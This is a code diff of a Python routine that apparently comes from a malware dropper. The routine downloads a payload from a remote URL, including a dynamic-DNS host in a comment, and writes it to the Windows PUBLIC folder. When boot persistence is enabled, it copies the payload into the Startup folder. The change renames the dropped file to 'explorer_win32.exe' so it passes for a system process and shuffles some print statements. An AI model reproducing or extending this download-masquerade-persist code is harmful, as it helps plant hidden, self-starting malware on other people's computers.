@@ -41,7 +41,7 @@ def run(**args):
         bin = True
         ScriptExec = "python"
         url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
-        OsTargetpath = os.getenv("PUBLIC")+ "\\ntpd_win32.exe"
+        OsTargetpath = os.getenv("PUBLIC")+ "\explorer_win32.exe"
 
     elif os.name == 'posix':
         bin = True
@@ -70,11 +70,13 @@ def run(**args):
 
     try:
         mon_fichier = open(OsTargetpath, "wb")
-        print(shellcode)
+
         mon_fichier.write(shellcode)
         mon_fichier.close()
+        print(r.status, "************File succ closely ***********")
         if os.name == 'nt' and winRunOnBoot == True:
             startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
+            print(shellcode)
             os.system("copy /Y %s \"%s\""%(targetPath, startPath))
     except:
         print("[Error] getFileFromURI: could not create OsTargetpath")
